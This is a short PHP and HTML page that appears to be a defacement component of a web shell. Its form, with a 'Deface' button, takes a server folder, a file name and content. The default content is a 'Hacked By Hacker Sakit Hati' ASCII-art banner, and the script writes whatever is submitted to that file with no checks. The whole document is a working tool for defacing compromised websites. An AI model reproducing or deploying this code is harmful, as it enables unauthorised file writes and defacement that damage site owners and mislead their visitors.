 <html>
<div align="center"><br>
  <TABLE align="center" style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="60%" bgColor=#303030 borderColorLight=#666666 border=1>
    <tr>
      <td width="100%">
  <b><center>
  <p align="center"><font face=tahoma>Cread All File </font></td>
  </tr>
  </table>
  <div align="center"><br>
    <TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="60%" bgColor=#303030 borderColorLight=#666666 border=1>
      <tr><td width="100%">
          <b>
          <form ENCTYPE="multipart/form-data" action="<?$_SERVER['PHP_SELF']?>" method=post>
            <p align="center">Folder :
              <input class="inputz" typ=text name=path size=50 value="<?=getcwd();?>">
              <br>
              Nama File 
         :
        <input class="inputz" typ=text name=file size=50 value="xXx-HsH-xXx.txt">
        <br>
        Scriptmu <br>
        <textarea class="inputz" name="url" cols=50 rows=4><?php echo htmlspecialchars('                                                                    .....                                                   

				Hacked By Hacker Sakit Hati

		_  _ ____ ____ _  _ ____ ____ ____ ____ _  _ _ ___ _  _ ____ ___ _ 
		|__| |__| |    |_/  |___ |__/ [__  |__| |_/  |  |  |__| |__|  |  | 
		|  | |  | |___ | \_ |___ |  \ ___] |  | | \_ |  |  |  | |  |  |  | 
                                                               			   


'); ?></textarea>
<br><input class="inputzbut" type=submit value=Deface></p></form><html></td></tr></table>
<?php
$mainpath=$_POST[path];
$file=$_POST[file];
$indexurl=$_POST[url];
$dir=opendir("$mainpath");
{

$start=@fopen("$file","w+");

$finish=@fwrite($start,$indexurl);
if ($finish)
{
echo "$file  sukses..!!<br>";
}
}
?>
  </div>
</div>             
